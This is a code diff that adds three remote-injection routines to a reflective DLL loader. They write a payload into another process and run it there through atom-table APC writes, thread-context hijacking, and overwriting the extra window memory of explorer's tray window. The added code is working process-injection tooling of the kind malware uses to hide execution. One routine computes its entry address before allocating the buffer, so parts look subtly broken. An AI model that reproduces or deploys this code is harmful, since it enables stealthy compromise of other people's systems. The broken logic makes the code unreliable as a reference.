@@ -210,3 +210,254 @@ HANDLE WINAPI LoadRemoteLibraryR2(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLeng
 
 	return hThread;
 }
+
+
+
+
+NTSTATUS(NTAPI* pNtQueueApcThread)(
+	_In_ HANDLE ThreadHandle,
+	_In_ PVOID ApcRoutine,
+	_In_ PVOID ApcRoutineContext OPTIONAL,
+	_In_ PVOID ApcStatusBlock OPTIONAL,
+	_In_ PVOID ApcReserved OPTIONAL
+	);
+
+
+void WINAPI LoadRemoteLibraryR3(HANDLE hProcess, DWORD tid, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter, const char* exportedFuncName)
+{
+
+
+
+	HANDLE th;
+	LPVOID target_payload;
+	DWORD dwReflectiveLoaderOffset = 0;
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	char* payload = (char*)lpBuffer;
+
+
+	try
+	{
+
+		if (!hProcess || !lpBuffer || !dwLength)
+			return;
+
+		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer, exportedFuncName);
+		if (!dwReflectiveLoaderOffset)
+			return;
+
+
+		
+
+		pNtQueueApcThread = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, PVOID)) GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThread");
+
+		th = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, tid);
+		if (th == NULL)
+			return;
+
+
+		target_payload = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //MEM_COMMIT guarantees 0's.
+		if (target_payload == NULL)
+			return;
+		
+
+		ATOM b = GlobalAddAtomA("b"); // arbitrary one char string
+		if (b == 0)
+			return;
+
+		if (payload[0] == '\0')
+			return;
+
+		for (DWORD64 pos = dwLength - 1; pos > 0; pos--)
+		{
+			if ((payload[pos] == '\0') && (payload[pos - 1] == '\0'))
+			{
+				(*pNtQueueApcThread)(th, GlobalGetAtomNameA, (PVOID)b, (PVOID)(((DWORD64)target_payload) + pos - 1), (PVOID)2);
+			}
+		}
+
+		for (char* pos = payload; pos < (payload + dwLength); pos +=  1) {
+
+			pos;
+		}
+
+		for (char* pos = payload; pos < (payload + dwLength); pos +=  1)
+		{
+			if (*pos == '\0')
+				continue;
+			
+			char ch[2];
+			ch[0]= pos[0];
+			ch[1] = '\0';
+
+			ATOM a;
+			//if (strlen(pos) > 255) {
+			//	a = GlobalAddAtomA(pos);
+			//}
+			//else
+				a = GlobalAddAtomA(ch);
+			if (a == 0)
+				return;
+
+			DWORD64 offset = pos - payload;
+			(*pNtQueueApcThread)(th, GlobalGetAtomNameA, (PVOID)a, (PVOID)(((DWORD64)target_payload) + offset), (PVOID)( 2));
+		}
+
+		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)target_payload + dwReflectiveLoaderOffset);
+		QueueUserAPC((PAPCFUNC)lpReflectiveLoader, th, (ULONG_PTR)lpParameter);
+	}
+	catch (...)
+	{
+		
+	}
+
+	return;
+}
+
+
+void WINAPI LoadRemoteLibraryR4(HANDLE hProcess, DWORD tid, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter, const char* exportedFuncName)
+{
+	CONTEXT old_ctx, new_ctx;
+	HANDLE tp;
+	DWORD dwReflectiveLoaderOffset = 0;
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	DWORD dwThreadId = 0;
+
+	try
+	{
+		if (!hProcess || !lpBuffer || !dwLength)
+			return ;
+
+		tp = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tid); // THREAD_QUERY_INFORMATION  is needed for GetProcessIdOfThread
+
+
+
+		// check if the library has a ReflectiveLoader
+		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer, exportedFuncName);
+		if (!dwReflectiveLoaderOffset)
+			return ;
+
+		// alloc memory (RWX) in the host process for the image
+		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (!lpRemoteLibraryBuffer)
+			return ;
+
+		// write the image into the host process
+		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
+		{
+			return ;
+		}
+
+		// add the offset to ReflectiveLoader() to the remote library address
+		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
+
+
+		HANDLE thread_handle = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid);
+		if (thread_handle == NULL)
+		{
+			return;
+		}
+
+		SuspendThread(thread_handle);
+		old_ctx.ContextFlags = CONTEXT_ALL;
+		if (!GetThreadContext(thread_handle, &old_ctx))
+		{
+			return;
+		}
+
+		new_ctx = old_ctx;
+		new_ctx.Rip = (DWORD64)lpReflectiveLoader;
+
+		if (!SetThreadContext(thread_handle, &new_ctx))
+		{
+			return;
+		}
+
+		ResumeThread(thread_handle);
+		Sleep(10000);
+		SuspendThread(thread_handle);
+		SetThreadContext(thread_handle, &old_ctx);
+		ResumeThread(thread_handle);
+
+	}
+	catch (...)
+	{
+		
+	}
+
+	return;
+}
+
+void WINAPI LoadRemoteLibraryR5(LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter, const char* exportedFuncName)
+{
+
+	DWORD dwReflectiveLoaderOffset = 0;
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	DWORD dwThreadId = 0;
+	DWORD process_id;
+
+	try
+	{
+		if ( !lpBuffer || !dwLength)
+			return;
+
+
+		// check if the library has a ReflectiveLoader
+		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer, exportedFuncName);
+		if (!dwReflectiveLoaderOffset)
+			return;
+
+
+
+		// add the offset to ReflectiveLoader() to the remote library address
+		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
+
+		HWND hWindow = FindWindowA("Shell_TrayWnd", NULL);
+		GetWindowThreadProcessId(hWindow, &process_id);
+		printf("hWindow=%p, explorer process_id=%d\n", hWindow, process_id);
+
+		DWORD64 old_obj = GetWindowLongPtrA(hWindow, 0);
+		printf("old_obj=0x%016llx\n", old_obj);
+
+		HANDLE h = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, process_id);
+		if (h == NULL)
+		{
+			//printf("Error in OpenProcess: 0x%x\n", GetLastError());
+			return ;
+		}
+
+		// alloc memory (RWX) in the host process for the image
+		lpRemoteLibraryBuffer = VirtualAllocEx(h, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (!lpRemoteLibraryBuffer)
+			return;
+
+		// write the image into the host process
+		if (!WriteProcessMemory(h, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
+		{
+			return;
+		}
+
+
+		DWORD64 new_obj[2];
+		LPVOID target_obj = VirtualAllocEx(h, NULL, sizeof(new_obj), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		new_obj[0] = (DWORD64)target_obj + sizeof(DWORD64); //&(new_obj[1])
+		// output->buffer will be equal to VirtualAllocEx return value in the Writer
+		new_obj[1] = (DWORD64)lpReflectiveLoader;
+
+		WriteProcessMemory(h, target_obj, new_obj, sizeof(new_obj), NULL);
+		SetWindowLongPtrA(hWindow, 0, (DWORD64)target_obj);
+		SendNotifyMessageA(hWindow, WM_PAINT, 0, 0);
+		Sleep(1);
+		SetWindowLongPtrA(hWindow, 0, old_obj);
+
+		CloseHandle(h);
+	}
+	catch (...)
+	{
+
+	}
+
+	return;
+}
